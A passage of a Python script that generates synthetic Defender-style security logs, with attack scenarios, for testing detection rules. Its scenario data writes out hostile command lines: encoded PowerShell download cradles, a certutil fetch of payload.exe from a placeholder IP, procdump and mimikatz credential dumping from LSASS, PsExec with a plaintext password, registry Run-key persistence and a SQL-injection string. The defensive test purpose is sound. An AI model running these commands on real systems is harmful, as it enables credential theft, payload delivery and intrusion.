"""
generate_logs.py — AI-assisted synthetic MDE log generator.

Generates realistic synthetic log datasets for testing detection rules and
demonstrating platform capabilities. Every generated event conforms to MDE
table schemas exactly — field names, ActionType enumerations, and value formats
match what real MDE produces so detection rules are portable without modification.

Usage:
    python scripts/generate_logs.py \\
        --table DeviceProcessEvents \\
        --events 1000 \\
        --attack-ratio 0.05 \\
        --scenario encoded-powershell \\
        --output ./generated/ \\
        --seed 42
"""

import argparse
import json
import logging
import random
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

# Add parent to path so we can import backend modules
sys.path.insert(0, str(Path(__file__).parent.parent))

from backend.schema.mde_tables import ACTION_TYPES, MDE_TABLES

logging.basicConfig(level=logging.WARNING, format="%(levelname)s %(message)s")
logger = logging.getLogger(__name__)

# Device tables carry DeviceId/DeviceName/AccountSid etc.
# Non-device tables (cloud, email, network-security) get their identity fields
# from the scenario template rather than the generic attack event base.
_DEVICE_TABLE_NAMES = frozenset({
    "DeviceProcessEvents",
    "DeviceNetworkEvents",
    "DeviceFileEvents",
    "DeviceRegistryEvents",
    "DeviceLogonEvents",
    "DeviceEvents",
    "DeviceImageLoadEvents",  # device-centric event stream, same base as the others
})

# ---------------------------------------------------------------------------
# Realistic value pools — match real MDE field value formats
# ---------------------------------------------------------------------------

_DEVICE_NAMES = [
    "CORP-WS-001", "CORP-WS-002", "CORP-WS-003", "CORP-WS-004", "CORP-WS-005",
    "DESKTOP-ABC123", "DESKTOP-XYZ789", "LAPTOP-HR-001", "LAPTOP-DEV-042",
    "SRV-DC01", "SRV-FILE01", "SRV-EXCHG01", "SRV-WEB01", "SRV-SQL01",
]

_USERNAMES = [
    "jsmith", "bjones", "amartin", "kwilliams", "lmiller", "dbrown",
    "rdavis", "cwilson", "tmoore", "sanderson", "administrator",
    "svc_backup", "svc_monitoring", "svc_deploy", "svc_scan",
]

_DOMAINS = ["CORP", "CONTOSO", "ACME", "corp.local"]

_BENIGN_PROCESSES = [
    ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
    ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("explorer.exe", "C:\\Windows\\explorer.exe"),
    ("notepad.exe", "C:\\Windows\\System32\\notepad.exe"),
    ("msiexec.exe", "C:\\Windows\\System32\\msiexec.exe"),
    ("taskmgr.exe", "C:\\Windows\\System32\\taskmgr.exe"),
    ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe"),
    ("wscript.exe", "C:\\Windows\\System32\\wscript.exe"),
    ("outlook.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
    ("teams.exe", "C:\\Users\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"),
]

_BENIGN_CMDLINES = [
    'svchost.exe -k netsvcs -p -s Schedule',
    '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer',
    'C:\\Windows\\system32\\svchost.exe -k LocalService',
    '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"',
    'C:\\Windows\\System32\\notepad.exe C:\\Users\\jsmith\\Documents\\notes.txt',
    'C:\\Windows\\System32\\msiexec.exe /i "setup.msi" /qn',
]

# Malicious command lines per scenario
_ATTACK_SCENARIOS: dict[str, dict[str, Any]] = {
    "encoded-powershell": {
        "table": "DeviceProcessEvents",
        "mitre": ["T1059.001"],
        "detection_rules": ["SYN-0001"],
        "events": [
            {
                "FileName": "powershell.exe",
                "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "ProcessCommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAG",
                "ActionType": "ProcessCreated",
                "InitiatingProcessFileName": "cmd.exe",
            },
            {
                "FileName": "powershell.exe",
                "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "ProcessCommandLine": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
                "ActionType": "ProcessCreated",
                "InitiatingProcessFileName": "wscript.exe",
            },
            {
                "FileName": "pwsh.exe",
                "FolderPath": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
                "ProcessCommandLine": "pwsh -ec JABpAHAAIAA9ACAAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaQBlAG0AYQBjACkALgBDAG8AbgB0AGUAbgB0",
                "ActionType": "ProcessCreated",
                "InitiatingProcessFileName": "explorer.exe",
            },
        ],
    },
    "lsass-dump": {
        "table": "DeviceProcessEvents",
        "mitre": ["T1003.001"],
        "detection_rules": ["SYN-0002"],
        "events": [
            {
                "FileName": "lsass.exe",
                "FolderPath": "C:\\Windows\\System32\\lsass.exe",
                "ActionType": "OpenProcessApiCall",
                "ProcessCommandLine": "",
                "InitiatingProcessFileName": "procdump64.exe",
                "InitiatingProcessCommandLine": "procdump64.exe -ma lsass.exe lsass.dmp",
            },
            {
                "FileName": "lsass.exe",
                "FolderPath": "C:\\Windows\\System32\\lsass.exe",
                "ActionType": "OpenProcessApiCall",
                "ProcessCommandLine": "",
                "InitiatingProcessFileName": "mimikatz.exe",
                "InitiatingProcessCommandLine": 'mimikatz.exe "sekurlsa::logonpasswords" exit',
            },
        ],
    },
    "registry-persistence": {
        "table": "DeviceRegistryEvents",
        "mitre": ["T1547.001"],
        "detection_rules": ["SYN-0004"],
        "events": [
            {
                "ActionType": "RegistryValueSet",
                "RegistryKey": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "RegistryValueName": "WindowsUpdate",
                "RegistryValueData": "C:\\Users\\jsmith\\AppData\\Roaming\\update.exe",
                "InitiatingProcessFileName": "powershell.exe",
                "InitiatingProcessCommandLine": "powershell.exe -Command Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'C:\\Users\\jsmith\\AppData\\Roaming\\update.exe'",
            },
        ],
    },
    "lateral-movement": {
        "table": "DeviceNetworkEvents",
        "mitre": ["T1021", "T1570"],
        "detection_rules": ["SYN-0007"],
        "events": [
            {
                "ActionType": "ConnectionSuccess",
                "RemoteIP": "10.0.1.50",
                "RemotePort": 445,
                "LocalIP": "10.0.1.10",
                "LocalPort": 49152,
                "Protocol": "TCP",
                "InitiatingProcessFileName": "PsExec.exe",
                "InitiatingProcessCommandLine": "PsExec.exe \\\\10.0.1.50 -u CORP\\administrator -p password123 cmd.exe",
                "InitiatingProcessAccountName": "jsmith",
            },
        ],
    },
    "certutil-download": {
        "table": "DeviceProcessEvents",
        "mitre": ["T1105", "T1027"],
        "detection_rules": ["SYN-0006"],
        "events": [
            {
                "FileName": "certutil.exe",
                "FolderPath": "C:\\Windows\\System32\\certutil.exe",
                "ActionType": "ProcessCreated",
                "ProcessCommandLine": "certutil.exe -urlcache -split -f http://192.168.1.100/payload.exe C:\\Windows\\Temp\\update.exe",
                "InitiatingProcessFileName": "cmd.exe",
                "InitiatingProcessCommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.100/payload.exe C:\\Windows\\Temp\\update.exe",
            },
        ],
    },
    "brute-force": {
        "table": "DeviceLogonEvents",
        "mitre": ["T1110", "T1078"],
        "detection_rules": ["SYN-0005"],
        "events": [
            {
                "ActionType": "LogonFailed",
                "AccountName": "administrator",
                "AccountDomain": "CORP",
                "LogonType": 3,
                "LogonTypeName": "Network",
                "FailureReason": "Unknown user name or bad password",
                "RemoteIP": "203.0.113.50",
                "IsLocalAdmin": False,
            },
        ],
    },
    # ------------------------------------------------------------------
    # AWS CloudTrail scenarios
    # ------------------------------------------------------------------
    "aws-root-usage": {
        "table": "AWSCloudTrailEvents",
        "mitre": ["T1078.004"],
        "detection_rules": ["SYN-0008"],
        "events": [
            {
                "AccountId": "123456789012",
                "ActionType": "AuthAttempt",
                "UserIdentityType": "Root",
                "UserIdentityArn": "arn:aws:iam::123456789012:root",
                "UserIdentityName": "root",
                "EventSource": "signin.amazonaws.com",
                "EventName": "ConsoleLogin",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "203.0.113.50",
                "UserAgent": "Mozilla/5.0",
                "ReadOnly": False,
                "MFAAuthenticated": False,
            },
            {
                "AccountId": "123456789012",
                "ActionType": "ManagementRead",
                "UserIdentityType": "Root",
                "UserIdentityArn": "arn:aws:iam::123456789012:root",
                "UserIdentityName": "root",
                "EventSource": "iam.amazonaws.com",
                "EventName": "ListUsers",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "203.0.113.50",
                "UserAgent": "aws-cli/2.13.0",
                "ReadOnly": True,
                "MFAAuthenticated": False,
            },
        ],
    },
    "aws-cloudtrail-disable": {
        "table": "AWSCloudTrailEvents",
        "mitre": ["T1562.008"],
        "detection_rules": ["SYN-0009"],
        "events": [
            {
                "AccountId": "123456789012",
                "ActionType": "ConfigChange",
                "UserIdentityType": "IAMUser",
                "UserIdentityName": "attacker",
                "UserIdentityArn": "arn:aws:iam::123456789012:user/attacker",
                "EventSource": "cloudtrail.amazonaws.com",
                "EventName": "StopLogging",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "198.51.100.10",
                "UserAgent": "aws-cli/2.13.0",
                "ReadOnly": False,
                "MFAAuthenticated": False,
            },
            {
                "AccountId": "123456789012",
                "ActionType": "ConfigChange",
                "UserIdentityType": "IAMUser",
                "UserIdentityName": "attacker",
                "UserIdentityArn": "arn:aws:iam::123456789012:user/attacker",
                "EventSource": "cloudtrail.amazonaws.com",
                "EventName": "DeleteTrail",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "198.51.100.10",
                "UserAgent": "aws-cli/2.13.0",
                "ReadOnly": False,
                "MFAAuthenticated": False,
            },
        ],
    },
    "aws-iam-escalation": {
        "table": "AWSCloudTrailEvents",
        "mitre": ["T1098", "T1136.003"],
        "detection_rules": ["SYN-0010"],
        "events": [
            {
                "AccountId": "123456789012",
                "ActionType": "ManagementWrite",
                "UserIdentityType": "IAMUser",
                "UserIdentityName": "attacker",
                "UserIdentityArn": "arn:aws:iam::123456789012:user/attacker",
                "EventSource": "iam.amazonaws.com",
                "EventName": "CreateUser",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "198.51.100.10",
                "UserAgent": "python-boto3/1.28.0",
                "RequestParameters": {"userName": "backdoor-svc"},
                "ReadOnly": False,
                "MFAAuthenticated": False,
            },
            {
                "AccountId": "123456789012",
                "ActionType": "ManagementWrite",
                "UserIdentityType": "IAMUser",
                "UserIdentityName": "attacker",
                "UserIdentityArn": "arn:aws:iam::123456789012:user/attacker",
                "EventSource": "iam.amazonaws.com",
                "EventName": "AttachUserPolicy",
                "EventCategory": "Management",
                "AWSRegion": "us-east-1",
                "SourceIPAddress": "198.51.100.10",
                "UserAgent": "python-boto3/1.28.0",
                "RequestParameters": {
                    "userName": "backdoor-svc",
                    "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
                },
                "ReadOnly": False,
                "MFAAuthenticated": False,
            },
        ],
    },
    # ------------------------------------------------------------------
    # Cloudflare scenarios
    # ------------------------------------------------------------------
    "cloudflare-waf-spike": {
        "table": "CloudflareFirewallEvents",
        "mitre": ["T1190"],
        "detection_rules": ["SYN-0011"],
        "events": [
            {
                "ActionType": "WAFBlock",
                "ClientIP": "203.0.113.99",
                "ClientCountry": "RU",
                "FirewallAction": "block",
                "FirewallRuleID": "waf-sqli-001",
                "FirewallRuleDescription": "SQLi attempt",
                "FirewallSource": "waf",
                "ClientRequestURI": f"/api/users?id=1' OR '1'='1",
                "ClientRequestMethod": "GET",
            }
            for _ in range(25)
        ],
    },
    "cloudflare-dns-threat": {
        "table": "CloudflareDnsEvents",
        "mitre": ["T1071.004"],
        "detection_rules": ["SYN-0012"],
        "events": [
            {
                "ActionType": "DnsThreatMatch",
                "SourceIP": "10.0.0.42",
                "QueryName": "c2.evilcorp.ru",
                "QueryType": "A",
                "ResponseCode": "NOERROR",
                "ThreatCategory": "Command and Control",
                "ThreatIndicator": "c2.evilcorp.ru",
                "Blocked": True,
            },
        ],
    },
    # ------------------------------------------------------------------
    # Zscaler scenarios
    # ------------------------------------------------------------------
    "zscaler-malware-download": {
        "table": "ZscalerWebEvents",
        "mitre": ["T1105"],
        "detection_rules": ["SYN-0013"],
        "events": [
            {
                "ActionType": "MalwareDetected",
                "UserName": "jsmith@corp.com",
                "Department": "Finance",
                "ClientIP": "10.0.0.55",
                "RequestURL": "http://malware-host.ru/payload.exe",
                "RequestHost": "malware-host.ru",
                "Protocol": "HTTP",
                "RequestMethod": "GET",
                "FileName": "payload.exe",
                "MalwareName": "Emotet.Gen",
                "MalwareClass": "Trojan",
                "FileSHA256": "a" * 64,
                "ResponseCode": 200,
                "SSLDecrypted": False,
            },
        ],
    },
    "zscaler-dlp": {
        "table": "ZscalerWebEvents",
        "mitre": ["T1048"],
        "detection_rules": ["SYN-0014"],
        "events": [
            {
                "ActionType": "DlpViolation",
                "UserName": "insider@corp.com",
                "Department": "Engineering",
                "ClientIP": "10.0.0.77",
                "RequestURL": "https://drive.google.com/upload/d/largefile",
                "RequestHost": "drive.google.com",
                "Protocol": "HTTPS",
                "RequestMethod": "POST",
                "ResponseCode": 200,
                "BytesOut": 50_000_000,
                "PolicyName": "DLP-Sensitive-Data",
                "SSLDecrypted": True,
            },
        ] * 5,  # 5 violations to trigger threshold
    },
    "zscaler-dns-sinkhole": {
        "table": "ZscalerDnsEvents",
        "mitre": ["T1071.004"],
        "detection_rules": ["SYN-0015"],
        "events": [
            {
                "ActionType": "DnsSinkhole",
                "UserName": "victim@corp.com",
                "ClientIP": "10.0.0.99",
                "QueryName": "beacon.apt29.io",
                "QueryType": "A",
                "ResponseCode": "NOERROR",
                "ThreatName": "APT29-Beacon",
                "ThreatCategory": "APT",
                "PolicyName": "Sinkhole-Threat-Intel",
            },
        ],
    },
    # ------------------------------------------------------------------
    # Proofpoint scenarios
    # ------------------------------------------------------------------
    "proofpoint-phish-verymalicious": {
        "table": "ProofpointMessageEvents",
        "mitre": ["T1566.001"],
        "detection_rules": ["SYN-0016"],
        "events": [
            {
                "NetworkMessageId": "phish-inv-8821@micros0ft-billing.com",
                "ActionType": "PhishFiltered",
                "SenderFromAddress": "invoices@micros0ft-billing.com",
                "SenderFromDomain": "micros0ft-billing.com",
                "SenderIP": "185.220.101.45",
                "SenderReputation": "VeryMalicious",
                "RecipientEmailAddress": "finance@corp.com",
                "RecipientEmailAddresses": ["finance@corp.com"],
                "Subject": "Invoice #INV-2024-8821 — Payment Required",
                "MessageSize": 12480,
                "SpamScore": 18.0,
                "PhishScore": 97.0,
                "ImpostorScore": 72.0,
                "MalwareScore": 0.0,
                "SpamVerdict": "Negative",
                "PhishVerdict": "Positive",
                "MalwareVerdict": "Negative",
                "BulkVerdict": "Negative",
                "DispositionAction": "quarantine",
                "QuarantineFolder": "Phish-Quarantine",
                "QuarantineRule": "TAP-Phish-Block",
                "PolicyRoutes": ["phish-block", "quarantine"],
                "ModulesRun": ["pdr", "dkim", "spf"],
                "ThreatsInfoMap": '[{"threatType":"phish","threatStatus":"active"}]',
                "AttachmentCount": 0,
                "AttachmentNames": None,
                "AttachmentTypes": None,
                "AttachmentSHA256": None,
                "UrlCount": 1,
                "HeaderFrom": "Microsoft Billing <invoices@micros0ft-billing.com>",
                "HeaderReplyTo": None,
                "XOriginatingIP": None,
                "DKIM": "fail",
                "DMARC": "fail",
                "SPF": "fail",
                "AdditionalFields": {},
            },
        ],
    },
    "proofpoint-impostor-delivered": {
        "table": "ProofpointMessageEvents",
        "mitre": ["T1566.001", "T1534"],
        "detection_rules": ["SYN-0017"],
        "events": [
            {
                "NetworkMessageId": "impostor-ceo-q1@corp-corp.com",
                "ActionType": "Delivered",
                "SenderFromAddress": "ceo@corp-corp.com",
                "SenderFromDomain": "corp-corp.com",
                "SenderIP": "45.33.32.156",
                "SenderReputation": "Suspicious",
                "RecipientEmailAddress": "cfo@corp.com",
                "RecipientEmailAddresses": ["cfo@corp.com"],
                "Subject": "Quick question — confidential",
                "MessageSize": 3200,
                "SpamScore": 5.0,
                "PhishScore": 40.0,
                "ImpostorScore": 96.0,
                "MalwareScore": 0.0,
                "SpamVerdict": "Negative",
                "PhishVerdict": "Negative",
                "MalwareVerdict": "Negative",
                "BulkVerdict": "Negative",
                "DispositionAction": "deliver",
                "QuarantineFolder": None,
                "QuarantineRule": None,
                "PolicyRoutes": ["default-inbound"],
                "ModulesRun": ["pdr", "impostor"],
                "ThreatsInfoMap": '[{"threatType":"impostor","threatStatus":"active"}]',
                "AttachmentCount": 0,
                "AttachmentNames": None,
                "AttachmentTypes": None,
                "AttachmentSHA256": None,
                "UrlCount": 0,
                "HeaderFrom": "John Smith <ceo@corp-corp.com>",
                "HeaderReplyTo": "jsmith-personal@gmail.com",
                "XOriginatingIP": None,
                "DKIM": "none",
                "DMARC": "fail",
                "SPF": "softfail",
                "AdditionalFields": {},
            },
        ],
    },
    "proofpoint-malware-sandbox": {
        "table": "ProofpointMessageEvents",
        "mitre": ["T1566.001", "T1059"],
        "detection_rules": ["SYN-0018"],
        "events": [
            {
                "NetworkMessageId": "malware-contract-docusign@legit-looking.net",
                "ActionType": "SandboxBlocked",
                "SenderFromAddress": "hr-team@legit-looking.net",
                "SenderFromDomain": "legit-looking.net",
                "SenderIP": "91.108.4.30",
                "SenderReputation": "Malicious",
                "RecipientEmailAddress": "bob@corp.com",
                "RecipientEmailAddresses": ["bob@corp.com"],
                "Subject": "Your Employment Contract — DocuSign Required",
                "MessageSize": 248320,
                "SpamScore": 8.0,
                "PhishScore": 55.0,
                "ImpostorScore": 20.0,
                "MalwareScore": 99.0,
                "SpamVerdict": "Negative",
                "PhishVerdict": "Negative",
                "MalwareVerdict": "Positive",
                "BulkVerdict": "Negative",
                "DispositionAction": "quarantine",
                "QuarantineFolder": "Malware-Quarantine",
                "QuarantineRule": "TAP-Malware-Block",
                "PolicyRoutes": ["sandbox-block", "malware-block"],
                "ModulesRun": ["pdr", "sandbox", "av"],
                "ThreatsInfoMap": '[{"threatType":"malware","threatStatus":"active","sha256":"aabbccdd"}]',
                "AttachmentCount": 1,
                "AttachmentNames": ["EmploymentContract_DocuSign.doc"],
                "AttachmentTypes": ["application/msword"],
                "AttachmentSHA256": ["aabbccdd" + "0" * 56],
                "UrlCount": 0,
                "HeaderFrom": "HR Team <hr-team@legit-looking.net>",
                "HeaderReplyTo": None,
                "XOriginatingIP": None,
                "DKIM": "pass",
                "DMARC": "fail",
                "SPF": "pass",
                "AdditionalFields": {},
            },
        ],
    },
    "proofpoint-click-blocked": {
        "table": "ProofpointClickEvents",
        "mitre": ["T1566.002", "T1204.001"],
        "detection_rules": ["SYN-0019"],
        "events": [
            {
                "NetworkMessageId": "click-phish-evil@evil-domain.xyz",
                "ActionType": "UrlBlocked",
                "RecipientEmailAddress": "alice@corp.com",
                "SenderFromAddress": "phisher@evil-domain.xyz",
                "SenderIP": "185.220.101.47",
                "Url": "http://evil-domain.xyz/login?redirect=corp.com",
                "UrlDomain": "evil-domain.xyz",
                "ThreatURL": "https://threatinsight.proofpoint.com/abc123",
                "ThreatStatus": "active",
                "Classification": "phish",
                "ThreatTime": None,
                "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121",
                "ClickIP": "10.0.0.42",
                "Blocked": True,
                "CampaignId": "campaign-evil-001",
                "AdditionalFields": {},
            },
        ],
    },
    # ------------------------------------------------------------------
    # Abnormal Security scenarios
    # ------------------------------------------------------------------
    "abnormal-bec-vip": {
        "table": "AbnormalThreatEvents",
        "mitre": ["T1566.001", "T1534"],
        "detection_rules": ["SYN-0020"],
        "events": [
            {
                "ActionType": "ThreatDetected",
                "AttackType": "BEC",
                "AttackStrategy": "NaivetyExploitation",
                "AttackVector": "Email",
                "ThreatStatus": "Active",
                "AbNormalScore": 0.97,
                "SenderFromAddress": "ceo-spoof@corp-hq.com",
                "SenderFromDomain": "corp-hq.com",
                "SenderDisplayName": "David Martinez (CEO)",
                "SenderIP": None,
                "IsSenderKnown": False,
                "ReplyToAddress": "ceo-real@protonmail.com",
                "RecipientEmailAddress": "cfo@corp.com",
                "RecipientName": "Sarah Johnson",
                "RecipientIsVIP": True,
                "ImpersonatedParty": "CEO",
                "ImpersonatedEmail": "ceo@corp.com",
                "Subject": "Wire Transfer — Confidential",
                "SubjectModified": False,
                "SuspiciousContent": ["urgency language", "financial request", "reply-to mismatch"],
                "RemediationStatus": "Auto-remediated",
                "RemediationTimestamp": None,
                "AttachmentCount": None,
                "AttachmentNames": None,
                "AttachmentSHA256": None,
                "UrlCount": None,
                "SuspiciousUrls": None,
                "CampaignId": None,
                "AdditionalFields": {},
            },
        ],
    },
    "abnormal-cross-layer-phish": {
        "table": "AbnormalThreatEvents",
        "mitre": ["T1566.001", "T1566.002"],
        "detection_rules": ["SYN-0021"],
        "events": [
            # Abnormal detection for same message that Proofpoint also blocked (SYN-0021 join)
            {
                "NetworkMessageId": "cross-layer-msg-001@corp.com",
                "ActionType": "ThreatDetected",
                "AttackType": "Phishing",
                "AttackStrategy": "ImpersonationOfKnownBrand",
                "AttackVector": "Link",
                "ThreatStatus": "Active",
                "AbNormalScore": 0.93,
                "SenderFromAddress": "no-reply@micros0ft-billing.com",
                "SenderFromDomain": "micros0ft-billing.com",
                "SenderDisplayName": "Microsoft Account Team",
                "SenderIP": "185.220.101.45",
                "IsSenderKnown": False,
                "ReplyToAddress": None,
                "RecipientEmailAddress": "user@corp.com",
                "RecipientName": "Regular User",
                "RecipientIsVIP": False,
                "ImpersonatedParty": "Microsoft",
                "ImpersonatedEmail": "account@microsoft.com",
                "Subject": "Unusual sign-in activity — verify now",
                "SubjectModified": False,
                "SuspiciousContent": ["brand impersonation", "credential harvesting URL"],
                "RemediationStatus": "Auto-remediated",
                "RemediationTimestamp": None,
                "AttachmentCount": None,
                "AttachmentNames": None,
                "AttachmentSHA256": None,
                "UrlCount": 1,
                "SuspiciousUrls": ["http://micros0ft-billing.com/verify"],
                "CampaignId": "apt-campaign-001",
                "AdditionalFields": {},
            },
        ],
    },
    "abnormal-case-high-severity": {
        "table": "AbnormalCaseEvents",
        "mitre": ["T1566", "T1078"],
        "detection_rules": ["SYN-0022"],
        "events": [
            {
                "ActionType": "CaseOpened",
                "CaseSeverity": "High",
                "CaseStatus": "New",
                "CaseType": "BEC",
                "ThreatCount": 8,
                "AffectedEmployeeCount": 4,
                "AffectedAccountCount": 4,
                "FirstObservedTimestamp": "2024-01-14T08:00:00+00:00",
                "LastObservedTimestamp": "2024-01-15T09:00:00+00:00",
                "RemediationStatus": "Auto-remediated",
                "RemediationTimestamp": None,
                "AnalystAssigned": None,
                "ResolutionReason": None,
                "AdditionalFields": {},
            },
        ],
    },
    # ------------------------------------------------------------------
    # DeviceImageLoadEvents scenarios
    # ------------------------------------------------------------------
    "dll-hijacking": {
        "table": "DeviceImageLoadEvents",
        "mitre": ["T1574.001", "T1574.002"],
        "detection_rules": ["SYN-0023"],
        "events": [
            {
                "ActionType": "ImageLoaded",
                "FileName": "cryptbase.dll",
                "FolderPath": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\cryptbase.dll",
                "SHA1": "aa" * 20,
                "SHA256": "aa" * 32,
                "MD5": "aa" * 16,
                "IsSigned": False,
                "IsCodeSigningCertValid": None,
                "Signer": None,
                "SignerHash": None,
                "Issuer": None,
                "IssuerHash": None,
                "InitiatingProcessFileName": "teams.exe",
                "InitiatingProcessCommandLine": '"C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"',
                "InitiatingProcessAccountName": "jsmith",
            },
            {
                "ActionType": "ImageLoaded",
                "FileName": "version.dll",
                "FolderPath": "C:\\ProgramData\\evil\\version.dll",
                "SHA1": "bb" * 20,
                "SHA256": "bb" * 32,
                "MD5": "bb" * 16,
                "IsSigned": False,
                "IsCodeSigningCertValid": None,
                "Signer": None,
                "SignerHash": None,
                "Issuer": None,
                "IssuerHash": None,
                "InitiatingProcessFileName": "msiexec.exe",
                "InitiatingProcessCommandLine": "msiexec.exe /i C:\\ProgramData\\evil\\installer.msi",
                "InitiatingProcessAccountName": "jsmith",
            },
        ],
    },
    # ------------------------------------------------------------------
    # MDO email scenarios
    # ------------------------------------------------------------------
    "mdo-phish-delivered": {
        "table": "EmailEvents",
        "mitre": ["T1566.001", "T1204.002"],
        "detection_rules": ["SYN-0024"],
        "events": [
            {
                "NetworkMessageId": "mdo-phish-delivered-001@attacker.io",
                "InternetMessageId": "<mdo-phish-delivered-001@attacker.io>",
                "SenderFromAddress": "updates@rn1crosoft.com",
                "SenderFromDomain": "rn1crosoft.com",
                "SenderDisplayName": "Microsoft Security",
                "SenderIPv4": "185.220.101.50",
                "SenderIPv6": None,
                "SenderMailFromAddress": "updates@rn1crosoft.com",
                "SenderMailFromDomain": "rn1crosoft.com",
                "RecipientEmailAddress": "user@corp.com",
                "RecipientObjectId": None,
                "Subject": "Unusual sign-in detected — verify your account",
                "ConfidenceLevel": "Low",
                "DeliveryAction": "Delivered",
                "DeliveryLocation": "Inbox",
                "EmailActionPolicy": None,
                "EmailActionPolicyGuid": None,
                "AttachmentCount": 0,
                "UrlCount": 2,
                "EmailLanguage": "en",
                "AuthenticationDetails": '{"SPF":"fail","DKIM":"fail","DMARC":"fail","CompAuth":"fail"}',
                "ThreatNames": ["Phish"],
                "ThreatTypes": ["Phish"],
                "DetectionMethods": '{"Phish":["URL reputation"]}',
                "OrgLevelPolicy": None,
                "OrgLevelAction": None,
                "UserLevelPolicy": None,
                "UserLevelAction": None,
                "Directionality": "Inbound",
                "Connectors": None,
            },
        ],
    },
    "mdo-malicious-attachment": {
        "table": "EmailAttachmentInfo",
        "mitre": ["T1566.001"],
        "detection_rules": ["SYN-0025"],
        "events": [
            {
                "NetworkMessageId": "mdo-malicious-attach-001@attacker.io",
                "SenderFromAddress": "billing@rogue-invoice.com",
                "RecipientEmailAddress": "finance@corp.com",
                "FileName": "Invoice_Q4_2024.xlsm",
                "FileType": "application/vnd.ms-excel.sheet.macroEnabled.12",
                "SHA256": "cc" * 32,
                "MalwareFamily": "Emotet",
                "ThreatNames": ["Emotet"],
                "ThreatTypes": ["Malware"],
                "DetectionMethods": '{"Malware":["File detonation","AV engine"]}',
            },
        ],
    },
    "mdo-zap": {
        "table": "EmailPostDeliveryEvents",
        "mitre": ["T1566.001"],
        "detection_rules": ["SYN-0026"],
        "events": [
            {
                # ZAP fired after phishing was initially delivered (same NetworkMessageId as mdo-phish-delivered)
                "NetworkMessageId": "mdo-phish-delivered-001@attacker.io",
                "InternetMessageId": "<mdo-phish-delivered-001@attacker.io>",
                "SenderFromAddress": "updates@rn1crosoft.com",
                "RecipientEmailAddress": "user@corp.com",
                "RecipientObjectId": None,
                "DeliveryLocation": "Inbox",
                "Action": "Deleted",
                "ActionType": "ZAP",
                "ActionTrigger": "ZAP",
                "ActionResult": "Success",
                "DeliveryTimestamp": None,
            },
        ],
    },
    # ------------------------------------------------------------------
    # MDO Safe Links click scenarios
    # ------------------------------------------------------------------
    "url-click-blocked": {
        "table": "UrlClickEvents",
        "mitre": ["T1566.002", "T1204.001"],
        "detection_rules": ["SYN-0027"],
        "events": [
            {
                "Url": "http://rn1crosoft.com/verify?token=eyJhbGciOiJIUzI1NiJ9",
                "ActionType": "ClickBlocked",
                "AccountUpn": "user@corp.com",
                "NetworkMessageId": "mdo-phish-delivered-001@attacker.io",
                "Workload": "Email",
                "IPAddress": "10.0.0.42",
                "IsClickedThrough": False,
                "UrlChain": ["http://rn1crosoft.com/verify?token=eyJhbGciOiJIUzI1NiJ9"],
                "ThreatTypes": ["Phish"],
                "DetectionMethods": '{"Phish":["URL reputation","Detonation"]}',
            },
        ],
    },
    # ------------------------------------------------------------------
    # Identity scenarios
    # ------------------------------------------------------------------
    "ad-privilege-escalation": {
        "table": "IdentityDirectoryEvents",
        "mitre": ["T1098", "T1078.002"],
        "detection_rules": ["SYN-0028"],
        "events": [
            {
                "ActionType": "MemberAddedToGroup",
                "Application": "Active Directory",
                "TargetAccountUpn": "jsmith@corp.local",
                "TargetAccountDisplayName": "John Smith",
                "TargetDeviceName": None,
                "DestinationDeviceName": "SRV-DC01",
                "DestinationIPAddress": "10.0.0.1",
                "DestinationPort": 389,
                "Protocol": "LDAP",
                "AccountUpn": "svc_deploy@corp.local",
                "AccountSid": "S-1-5-21-1234567890-1234567890-1234567890-1103",
                "AccountObjectId": None,
                "AccountDisplayName": "Deploy Service Account",
                "AccountName": "svc_deploy",
                "AccountDomain": "CORP",
                "DeviceName": "CORP-WS-001",
                "IPAddress": "10.0.0.10",
                "Port": 49152,
                "Location": None,
                "ISP": None,
                "CountryCode": None,
                "City": None,
                "AdditionalFields": '{"GroupName":"Domain Admins","GroupSid":"S-1-5-21-1234567890-1234567890-1234567890-512"}',
            },
            {
                "ActionType": "AdminPrivilegeGranted",
                "Application": "Active Directory",
                "TargetAccountUpn": "jsmith@corp.local",
                "TargetAccountDisplayName": "John Smith",
                "TargetDeviceName": None,
                "DestinationDeviceName": "SRV-DC01",
                "DestinationIPAddress": "10.0.0.1",
